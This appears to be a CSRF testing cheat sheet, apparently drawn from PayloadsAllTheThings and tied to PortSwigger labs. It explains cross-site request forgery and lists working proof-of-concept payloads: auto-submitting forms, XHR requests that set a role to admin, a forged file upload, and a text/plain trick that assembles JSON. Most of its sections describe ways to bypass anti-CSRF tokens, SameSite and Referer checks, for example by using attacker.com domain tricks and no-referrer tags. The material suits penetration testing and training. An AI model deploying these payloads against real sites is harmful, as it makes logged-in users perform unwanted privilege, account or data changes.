meta.caption: Flowchart for checking CSRF: does the application react to a cross-site request → is a CSRF token required → GET or POST → can you build a simple request (text/plain, x-www-form-urlencoded, multipart) or is a complex one needed (application/json). Branches lead to the appropriate PoC (GET/POST/JSON) or to the conclusion "CSRF Not Possible". Source: TrustFoundry / PayloadsAllTheThings.

entries.title: What is CSRF
entries.body:
CSRF (Cross-Site Request Forgery) forces an authenticated user to perform an unwanted action in an application where they are already logged in. The attack targets state-changing requests rather than data theft - the attacker does not see the response to the forged request.

When you are logged in, you have a session. Its identifier is stored in a browser cookie and is sent with every request to the site. Even if the request is initiated by a third-party site, the cookie still goes along with the request, and it is processed as if it were made by the logged-in user.

entries.title: How to test for CSRF
entries.body:
• Look for state-changing requests: change of email/password/name, role change, funds transfer, adding privileges, deletion.
• Check that the request has no anti-CSRF token (or that it is not validated). If a token exists - try bypasses: remove the token, empty token, another user's token, predictable token.
• Determine the request type from the cheat sheet: GET / POST / JSON. Pick the minimal PoC.
• For POST-JSON: try changing the Content-Type to text/plain or x-www-form-urlencoded - a "simple" request does not trigger preflight and often goes through.
• Check the SameSite cookie (Lax/Strict/None) and Referer/Origin validation - these are the main defenses.
• Generate a PoC, open it in a second session/incognito with a logged-in victim, and confirm that the action was performed.

entries.title: Tools
entries.body:
0xInfection/XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.
Burp Suite → right-click the request → Engagement tools → Generate CSRF PoC.

entries.title: HTML GET - with user action (click)
entries.body: Click Me

entries.title: HTML GET - without user action (img)
HTML POST - with user action (click)
entries.body:
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>

entries.title: HTML POST - autosubmit, without user action
entries.body:
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>

entries.title: HTML POST - multipart/form-data with file upload (click)
entries.body:
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
    dT.items.add( file );
    document.xss[0].files = dT.files;

    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
<input id="file" type="file" name="file"/>
<input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">Submit Request</button>

entries.title: JSON GET - simple request (XHR)
entries.body:
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>

entries.title: JSON POST - simple request (XHR, text/plain)
entries.body:
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>

entries.title: JSON POST - autosubmit form (bypassing browser defenses)
entries.body:
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
// this input will send : {"role":admin,"other":"="}
 <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getElementById("CSRF_POC").submit();
</script>

entries.title: JSON POST - complex request (XHR, application/json)
entries.body:
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>

entries.title: Note on simple vs complex request
entries.body:
application/json is not allowed in a "simple" request - the default is text/plain. A "simple" request (GET/POST/HEAD with Content-Type text/plain | x-www-form-urlencoded | multipart/form-data) does not trigger a CORS preflight and goes out with cookies → suitable for CSRF.

A complex request (application/json;charset=UTF-8, etc.) triggers a preflight OPTIONS. It will work only if the server itself responds with permissive CORS headers. A form with enctype="text/plain" can "glue together" valid JSON and bypass protections that require preflight (for example, the Standard mode of Enhanced Tracking Protection in Firefox).

entries.title: No defense present
entries.body:
The simplest case: there is no anti-CSRF token at all, Referer/Origin validation is absent, SameSite is not set. Any standard PoC (GET/POST/JSON) will work directly.
Lab: PortSwigger - CSRF vulnerability with no defenses.

entries.title: Token is validated only for one method
entries.body:
Sometimes the token is checked only for POST but not for GET (or vice versa). Change the request method: turn POST into GET (parameters in the query string) - token validation may fall away and you can skip sending it entirely.
Lab: PortSwigger - CSRF where token validation depends on request method.

entries.title: Token is checked only if present
entries.body:
The server validates the token only when the parameter is sent. Remove the token parameter from the request entirely (not empty - but absent) - the check is skipped, and CSRF goes through.
Lab: PortSwigger - CSRF where token validation depends on token being present.

entries.title: Token is not tied to the user session
entries.body:
The token is valid but not tied to a specific session. Log in with your own account, obtain a valid token, and insert it into the PoC for the victim - the server will accept the "foreign" token.
Lab: PortSwigger - CSRF where token is not tied to user session.

entries.title: Token is tied to a non-session cookie
entries.body:
The token is checked against a separate (non-session) cookie. If there is a way to set your own cookie on the victim (for example, via header injection/a subdomain), set the cookie+token pair from yourself - the check will match.
Lab: PortSwigger - CSRF where token is tied to non-session cookie.

entries.title: Token is duplicated in a cookie (double-submit)
entries.body:
The double-submit pattern: the server only checks that the token in the parameter equals the token in the cookie, without validating it itself. If you can set a cookie on the victim, set the same arbitrary value both in the cookie and in the form parameter - they will match.
Lab: PortSwigger - CSRF where token is duplicated in cookie.

entries.title: Referer is checked only when the header is present
entries.body:
The server validates the Referer only if it is sent. Suppress sending the Referer entirely, and the check is skipped:

<meta name="referrer" content="no-referrer">

or the rel="noreferrer" attribute on the link/form.
Lab: PortSwigger - CSRF where Referer validation depends on header being present.

entries.title: Broken Referer validation
entries.body:
If the server checks only a substring (the domain appears somewhere in the Referer), bypass the naive check. Place the expected domain in your own URL - as a subdomain or as a parameter:

http://attacker.com/?vulnerable-website.com
http://vulnerable-website.com.attacker.com/

To get the full path/query into the Referer, relax the page policy:
<meta name="referrer" content="unsafe-url">
Lab: PortSwigger - CSRF with broken Referer validation.
